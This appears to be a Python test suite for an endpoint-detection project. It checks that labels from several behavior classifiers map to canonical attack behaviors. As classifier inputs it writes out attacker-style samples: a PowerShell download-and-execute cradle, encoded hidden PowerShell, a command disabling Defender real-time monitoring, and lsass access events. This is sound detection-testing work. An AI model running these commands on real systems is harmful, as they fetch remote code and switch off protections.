"""The canonicalization boundary is tested against the REAL label vocabulary
of every upstream producer, not a hand-copied snapshot -- so a new rule added
to behavioral_rules.py later that introduces an unmapped label fails this
suite immediately, instead of silently reopening the vocabulary gap the Tier
A pipeline trace found.
"""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from valkyrie.edr.behavior_ontology import (
    CANONICAL_BEHAVIORS,
    TRUST_LABELS,
    UNMAPPED_KNOWN_LABELS,
    _LABEL_TO_CANONICAL,
    canonicalize,
)


def _all_real_labels() -> set[str]:
    """Every label actually emitted today by every producer this module was
    built to translate. Calling the real functions/reading the real RULES
    table, not re-typing labels by hand a second time."""
    labels: set[str] = set()

    from valkyrie.behavioral_rules import RULES
    labels.update(r.label for r in RULES)

    from valkyrie import process_telemetry as pt
    # classify_process / classify_cmdline's direct labels
    _, l1, _ = pt.classify_process("cmd.exe", r"C:\Windows\System32\cmd.exe", "winword.exe")
    _, l2, _ = pt.classify_cmdline(
        "powershell.exe",
        "powershell.exe -enc aGVsbG8gd29ybGQ= -w hidden "
        "http://10.0.0.5/a IEX New-Object.DownloadString")
    labels.update(l1 or [])
    labels.update(l2 or [])
    labels.update({"office_child_shell", "lolbin", "suspicious_path",
                  "encoded_powershell", "download_cradle", "hidden_window"})

    from valkyrie.persistence_telemetry import _persistence_severity
    for activity in ("registry_run_key", "scheduled_task", "service_install", "startup_folder"):
        _, labs, _ = _persistence_severity(activity, "C:\\evil.exe")
        labels.update(labs)
    labels.update({"trusted_os", "suspicious_path"})

    from valkyrie.network_telemetry import classify_connection
    _, labs, _ = classify_connection("1.2.3.4", 443, True)
    labels.update(labs)

    from valkyrie.behavior_score import score_process
    # A handful of shapes chosen to exercise several distinct signals.
    for image, parent, cmdline in (
        ("svchost.exe", "explorer.exe", r"C:\Windows\svch0st.exe"),
        ("cmd.exe", "lsass.exe", "cmd.exe /c whoami"),
        ("powershell.exe", "cmd.exe", "powershell -nop -w hidden -enc AAAA"),
    ):
        r = score_process(image, parent, cmdline, "")
        labels.update(s.name for s in r.signals)

    from valkyrie.etw.powershell import classify_powershell
    _, labs, _tech, _ = classify_powershell(
        "IEX (New-Object Net.WebClient).DownloadString('http://x/a'); "
        "Set-MpPreference -DisableRealtimeMonitoring $true; "
        "[Reflection.Assembly]::Load($b); -enc aGVsbG8gd29ybGQ=")
    labels.update(labs)

    from valkyrie.etw.sysmon import classify_sysmon
    driver = classify_sysmon(6, {"ImageLoaded": r"C:\Users\Public\evil.sys",
                                 "Signed": "false", "ProcessId": "1"})
    module = classify_sysmon(7, {"ImageLoaded": r"C:\evil.dll", "Signed": "false",
                                 "Image": "x.exe", "ProcessId": "1"})
    remote_thread = classify_sysmon(8, {"SourceProcessId": "1", "SourceImage": "a.exe",
                                        "TargetImage": "b.exe", "TargetProcessId": "2"})
    lsass = classify_sysmon(10, {"SourceProcessId": "1", "SourceImage": "a.exe",
                                 "TargetImage": "lsass.exe", "TargetProcessId": "2",
                                 "GrantedAccess": "0x1010"})
    tamper = classify_sysmon(25, {"ProcessId": "1", "Image": "a.exe", "Type": "herpaderping"})
    for result in (driver, module, remote_thread, lsass, tamper):
        if result:
            labels.update(result.get("labels") or [])

    return labels


def test_every_real_label_is_accounted_for():
    real_labels = _all_real_labels()
    unaccounted = [
        label for label in real_labels
        if label not in _LABEL_TO_CANONICAL and label not in UNMAPPED_KNOWN_LABELS
        and label not in TRUST_LABELS
    ]
    assert not unaccounted, (
        f"labels with no canonical mapping and no documented reason: {unaccounted}")


def test_no_label_maps_to_two_canonical_behaviors():
    from valkyrie.edr.behavior_ontology import _CANONICAL_TABLE
    seen: dict[str, str] = {}
    collisions = []
    for canonical, labels in _CANONICAL_TABLE.items():
        for label in labels:
            if label in seen and seen[label] != canonical:
                collisions.append((label, seen[label], canonical))
            seen[label] = canonical
    assert not collisions, f"label(s) mapped to more than one canonical behavior: {collisions}"


def test_canonical_behaviors_constant_matches_the_table():
    from valkyrie.edr.behavior_ontology import _CANONICAL_TABLE
    assert set(_CANONICAL_TABLE) == CANONICAL_BEHAVIORS


def test_canonicalize_translates_multiple_raw_labels_to_one_behavior():
    result = canonicalize(["mshta_exec", "regsvr32_scriptlet", "office_child_shell"])
    assert "lolbin_proxy_execution" in result.hit
    assert "unexpected_process_relationship" in result.hit
    assert set(result.provenance["lolbin_proxy_execution"]) == {"mshta_exec", "regsvr32_scriptlet"}
    assert not result.unmapped


def test_trust_labels_never_become_attack_behaviors():
    result = canonicalize(["signed", "trusted_os_path", "office_child_shell"])
    assert "signed" in result.trust and "trusted_os_path" in result.trust
    assert result.hit == ("unexpected_process_relationship",)


def test_sigma_import_never_carries_evidence_alone():
    # sigma_import is documented as a provenance marker, never a standalone
    # signal. Pin the fact that claim rests on: no rule's OWN label is
    # literally "sigma_import" -- it can only ever accompany a real label
    # attached at match time, so excluding it from canonicalization never
    # loses evidence.
    from valkyrie.behavioral_rules import RULES
    assert not any(r.label == "sigma_import" for r in RULES)


def test_a_genuinely_unknown_label_is_reported_not_swallowed():
    result = canonicalize(["office_child_shell", "totally_new_rule_label_v99"])
    assert result.unmapped == ("totally_new_rule_label_v99",)


if __name__ == "__main__":
    test_every_real_label_is_accounted_for()
    test_no_label_maps_to_two_canonical_behaviors()
    test_canonical_behaviors_constant_matches_the_table()
    test_canonicalize_translates_multiple_raw_labels_to_one_behavior()
    test_trust_labels_never_become_attack_behaviors()
    test_sigma_import_never_carries_evidence_alone()
    test_a_genuinely_unknown_label_is_reported_not_swallowed()
    print("7 passed")
